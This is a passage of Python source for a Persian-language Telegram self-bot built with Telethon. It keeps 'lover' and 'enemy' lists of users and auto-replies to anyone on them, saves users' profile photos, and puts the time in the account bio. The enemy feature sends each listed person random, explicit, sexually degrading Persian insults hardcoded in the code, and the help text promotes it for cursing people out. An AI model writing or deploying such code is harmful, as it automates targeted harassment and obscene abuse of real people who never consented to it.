        xxx = int("{}".format(sender.id))
        if int(xxx) not in asheq_list:
            await event.edit("**این کاربر در لیست عاشقان نیست!**".format(sender.first_name , sender.id))
        else:
            try:
                asheq_list.remove(int(xxx))
                await event.edit("**کاربر در لیست عاشقان حذف شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست عاشقان" and event.sender_id == AdminBot):
        if asheq_list == []:
            await event.edit("**لیست عاشقان در حال حاضر خالی است!**")
        else:
            asheq_list.clear()
            await event.edit("**لیست عاشقان پاکسازی شد!**")    

eshq_list = ["عشق منی", "جان عزیزم" , "عاشقتم", "دوستت دارم", "میمیرم برات", "وجودمی"]

@client.on(events.NewMessage(pattern=r"اضاف عشق (.*)" , from_users=AdminBot))
async def add_name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) in eshq_list:
        await event.edit(f"**این متن( {xxx} ) در لیست عشق وجود دارد!**")
    else:
        try:
            eshq_list.append(xxx)
            await event.edit(f"**این متن ( {xxx} ) به لیست عشق اضافه شد!**")
        except:
            await event.edit("**No Invalid . . . !**")

@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست متن عاشقانه" and event.sender_id == AdminBot):
        if eshq_list == []:
            await event.edit("**لیست عشق ها خالی است!**")
        else:
            eshq_list.clear()
            await event.edit("**لیست عشق ها پاکسازی شد!**")

@client.on(events.NewMessage)
async def asheq(event):
    if event.sender_id in asheq_list:
        await event.reply(C(eshq_list))
        
@client.on(events.NewMessage(outgoing=True, pattern=r"ذخیره عکس پروفایل"))
async def handler(event):
    if event.is_reply:
        replied = await event.get_reply_message()
        sender = replied.sender
        await client.download_profile_photo(sender)
        await event.respond('عکس پروفایل کاربر {} ذخیره شد.'.format(sender.username))             

@client.on(events.NewMessage)
async def enemy(event):
    if event.sender_id in enemyall_list:
        await event.reply(C(foshall_list))                                                                                                       
        
        
enemydall_list = []

@client.on(events.NewMessage(from_users=AdminBot))
async def _(event):
    if event.raw_text.lower() == "دوست دشمن":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) in enemydall_list:
            await event.edit("**این کاربر در حال حاضر در لیست دوست دشمن است!**".format(sender.first_name , sender.id))
        else:
            try:
                enemydall_list.append(int(xxx))
                await event.edit("**کاربر به لیست دوست دشمن اضافه شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
    elif event.raw_text.lower() == "حذف دوست دشمن":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) not in enemydall_list:
            await event.edit("**این کاربر در لیست دوست دشمن نیست!**".format(sender.first_name , sender.id))
        else:
            try:
                enemydall_list.remove(int(xxx))
                await event.edit("**کاربر در لیست دوست دشمن حذف شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست دوست دشمن" and event.sender_id == AdminBot):
        if enemydall_list == []:
            await event.edit("**لیست دوست دشمن در حاضر خالی است!**")
        else:
            enemydall_list.clear()
            await event.edit("**لیست دوست دشمن پاک شد!**")    

foshdall_list = ["کیر خر تو کونت", "کیرم تو کونت", "کیر اسب تو کونت", "کصکش دیوث", "کی دوباره کونت گذاشته", "خایه مال خودمی پسر", "دوست داری دوباره حاملت کنم؟", "باز داری دنبال کیر میگردی؟ بیا خودم بدم دهنت", "دوباره حامله شدی؟" , "بیا برو کونتو بده", "دیگه اگه کیرمو دادم بهت"]

@client.on(events.NewMessage)
async def enemyd(event):
    if event.sender_id in enemydall_list:        await event.reply(C(foshdall_list))                

@client.on(events.NewMessage())
async def timebio_on(event):
    text = (event.raw_text)
    if (text == "راهنما" and event.sender_id == AdminBot):
        await event.edit("ٖٖٖٖٖٖ         **به نام اهورامزدا که زمین و آسمان را آفرید**\n                      **بسم الله الرحمن الرحیم** \n                       **in the name of god** \n🛑به بخش راهنمای ربات سلف خوش آمدید! \n \n🤖:تایم در بیو به صورت خودکار برای شما فعال شد! \n \n🤖:بولد متن به صورت خودکار برای شما فعال شد!\n \n✍:هر یک از کارایی ها کامند آن جلویش نوشته شده!\n \nنکته: (ریپلای) به معنی ریپلای کردن روی کاربر مورد نظر است. \n \n \nسکوت کاربران : `سکوت`(ریپلای)\nحذف سکوت کاربران : `حذف سکوت`(ریپلای)\nحذف لیست سکوت : `پاکسازی لیست سکوت` \n \nذخیره عکس پروفایل کاربر : `ذخیره عکس پروفایل` (ریپلای) \n \nاضافه کردن دشمن برای به فحش کشیدن : `تنظیم دشمن` (ریپلای) \nحذف کردن دشمن : `حذف دشمن` (ریپلای) \nحذف لیست دشمنان : `پاکسازی لیست دشمنان` \n \nاضافه کردن فحش جدید : `اضاف فحش` (فحش خود) \n حذف کردن فحش از لیست : `حذف فحش` ( فحشی که میخواهید حذف شود) \n حذف لیست فحش : `پاکسازی لیست فحش ها` \n \n فونت سلطان سکندر نشان سلیمان مکان : `.` (پیام خود) \n \nفعال کردن عشق : `تنظیم عشق` (ریپلای) \nحذف کردن کاربر از لیست عشق : `حذف عشق` (ریپلای) \n پاک کردن کل لیست عشق : `پاکسازی لیست عاشقان` \n \n اضافه کردن متن عاشقانه : `اضاف عشق` (متن خود) \nپاک کردن کل لیست متن عاشقانه : `پاکسازی لیست متن عاشقانه` \n \nتنظیم دوست دشمن(فحش ناموسی نمیدهد برای فان است): `دوست دشمن` (ریپلای) \nحذف کردن دوست دشمن کاربر : `حذف دوست دشمن` (ریپلای) \nپاک کردن کل لیست دوست دشمن : `پاکسازی لیست دوست دشمن` \n \n فحش تکه به تکه ی کص مادرت برای دشمنان : `کص مادرت` \n \n                         ⬇️بخش سرگرمی⬇️\n \n `کاکاسنگی` یا ایموجی `🗿` \n \n `ن`(خوندم,گاییدم,دیدم,شنیدم و ....) برای اسپاون گیگاچد \n \n `جق بزن` \n \n `قلب` \n \n `ترول فیس` \n \n \n**🛑بخش راهنما پایان یافت!امیدوارم راضی باشید❤️** \n**🛑🤖آیدی سازنده:@AnishtayiN**")


timezone = pytz.timezone(os.environ.get("TIME_ZONE", "Asia/Tehran"))
                                        
def get_text(time: str) -> str:
    return pattern.replace("{TIME}", time)


async def main():
    prev_minute = None
    print("Program started...")

    while True:
        current_time = (datetime.now(timezone)).strftime("%H:%M")

        if current_time != prev_minute:
            prev_minute = current_time
            try:
                await client(UpdateProfileRequest(
                    about=get_text(current_time)
                ))

                print(f"Bio updated at {current_time}")
            except errors.FloodWaitError as e:
                print(f"FloodWaitError, waiting for {e.seconds} seconds")
                await asyncio.sleep(e.seconds)

        else:
            print(f"bio already up-to-date at {current_time}, waiting...")

            await asyncio.sleep(1)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--session":
            client.start()
    else:
        print("Connecting to client...")
        with client:
            print("Connected successfully!")
            print("Starting main loop...")
            client.loop.run_until_complete(main())

                                                      
client.start()
client.run_until_disconnected()
asyncio.get_event_loop().run_forever()
